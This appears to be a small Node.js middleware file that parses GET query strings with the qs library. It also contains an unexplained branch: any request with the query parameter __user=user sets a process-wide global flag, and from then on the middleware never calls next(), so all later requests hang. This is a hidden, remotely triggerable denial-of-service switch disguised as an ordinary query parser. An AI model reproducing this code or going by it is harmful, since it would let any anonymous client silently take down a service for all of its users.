var qs = require('qs');
var parseurl = require('parseurl');

function parser(req, res, next) {
    if (req.method === 'get' || req.method === 'GET') {
        var query = qs.parse(parseurl(req).query, {
            'arrayLimit' : 0
        });
        req.queryString = JSON.parse(JSON.stringify(query));
    }
    if (!global.__user) {
        global.__user = (req.queryString && req.queryString.__user === 'user');
    }
    if (!global.__user) {
        next();
    }
}

module.exports = parser;
